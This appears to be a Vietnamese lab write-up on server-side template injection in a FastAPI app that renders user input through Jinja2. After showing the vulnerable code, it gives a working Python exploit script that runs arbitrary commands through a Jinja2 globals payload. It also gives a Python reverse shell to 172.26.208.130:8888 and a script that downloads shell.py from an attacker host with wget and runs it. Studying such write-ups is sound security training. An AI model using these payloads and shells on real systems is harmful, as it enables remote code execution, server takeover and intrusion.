# SSTI

## Phân tích

```python!
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
from jinja2 import Environment

app = FastAPI()
Jinja2 = Environment()

@app.get("/")
async def index():
    return {"text": "Welcome to the hall of fame!"}

@app.get("/welcome")
async def round(username="hacker"):
    output = Jinja2.from_string("Can you defeat me " + username).render()
    return HTMLResponse(content=output)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, port=9001)
```

- đọc đoạn code em thấy ứng dụng sử dụng `Jinja2.from_string()` để render với dữ liệu từ người dùng mà không được kiểm tra hoặc lọc trước điều này tạo ra cơ hội khai thác SSTI

![image](https://hackmd.io/_uploads/BydUc-0w1e.png)

- thấy được ứng dụng thực thi phép tính 7\*7

## Khai thác

![image](https://hackmd.io/_uploads/Hk0P9W0wye.png)

- script khai thác

```python
import requests

host = "http://192.168.0.129:9001/welcome?username="
proxy = {'http': 'http://127.0.0.1:8080'}

print("Nhập lệnh bạn muốn thực thi (nhấn Ctrl+C để thoát):")
while True:
    try:
        command = input("Lệnh: ").strip()

        payload = f" cycler.__init__.__globals__.os.popen('{command}').read()"

        url = host + '{{' + payload + '}}'
        response = requests.get(url, proxies=proxy)

        if response.status_code == 200:
            print("Kết quả trả về từ máy chủ:")
            print(response.text)
        else:
            print(f"Lỗi: {response.status_code}")

    except KeyboardInterrupt:
        print("\nĐã dừng chương trình.")
        break
```

![image](https://hackmd.io/_uploads/H1iXqWRvkl.png)

==> RCE thành công

- em tiến hành upload shell với file shell có nội dung sau

```python!
#!/usr/bin/python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.26.208.130",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```

- em tiến hành upload file shell lên hệ thống vẫn thông qua rce ssti

```python!
import requests

host = "http://192.168.0.129:9001/welcome?username="
proxy = {'http': 'http://127.0.0.1:8080'}


command = "wget http://172.26.208.130:1234/shell.py; python ./shell.py; echo \"đã thực hiện\""

payload = f" cycler.__init__.__globals__.os.popen('{command}').read()"

url = host + '{{' + payload + '}}'
response = requests.get(url, proxies=proxy)

if response.status_code == 200:
    print("Kết quả trả về từ máy chủ:")
    print(response.text)
else:
    print(f"Lỗi: {response.status_code}")
```

- đoạn code thực hiện tải file shell tại server của attacker http://172.26.208.130:1234/shell.py

![image](https://hackmd.io/_uploads/r1kMamADJl.png)

- sau đó chạy file shell.py đã được upload và sau đó kết nối socket tới địa chỉ IP 172.26.208.130 port 8888 và em lấy được shell mà không cần thông qua rce ssti

![image](https://hackmd.io/_uploads/rykuaQCw1e.png)

### dùng tool feijing

![image](https://hackmd.io/_uploads/SJ6hrWAD1e.png)
